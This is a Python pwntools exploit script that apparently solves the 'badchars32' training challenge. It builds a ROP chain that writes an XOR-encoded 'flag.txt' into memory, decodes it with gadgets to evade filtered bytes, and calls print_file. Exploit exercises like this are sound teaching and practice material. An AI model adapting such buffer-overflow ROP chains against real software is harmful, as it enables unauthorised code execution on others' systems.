#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# pyright: reportUndefinedVariable=false
from pwn import *

exe = context.binary = ELF("badchars32")


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
b *pwnme+273
continue
""".format(
    **locals()
)
mov_edi_esi = 0x0804854F
pop_esi_edi_ebp = 0x080485B9
pop_ebx = 0x0804839D
pop_ebp = 0x080485BB
_data = 0x0804A018
xor_ebp_bl = 0x08048547

xor_value = 0x2
xor_string = xor(b"flag.txt", xor_value)

# stage-1 (writing xored value)
pay = b"\x90" * 44
pay += p32(pop_esi_edi_ebp)
pay += xor_string[:4]
pay += p32(_data)
pay += p32(0x0)
pay += p32(mov_edi_esi)
pay += p32(pop_esi_edi_ebp)
pay += xor_string[4:]
pay += p32(_data + 0x4)
pay += p32(0x0)
pay += p32(mov_edi_esi)

# stage-2 (xoring back)
for _ in range(len(xor_string)):
    pay += p32(pop_ebp)
    pay += p32(_data + _)
    pay += p32(pop_ebx)
    pay += p32(xor_value)
    pay += p32(xor_ebp_bl)

# stage-3 (printing flag)
pay += p32(exe.sym.print_file)
pay += p32(exe.sym._start)
pay += p32(_data)

io = start()
io.clean()
io.sendline(pay)
io.interactive()
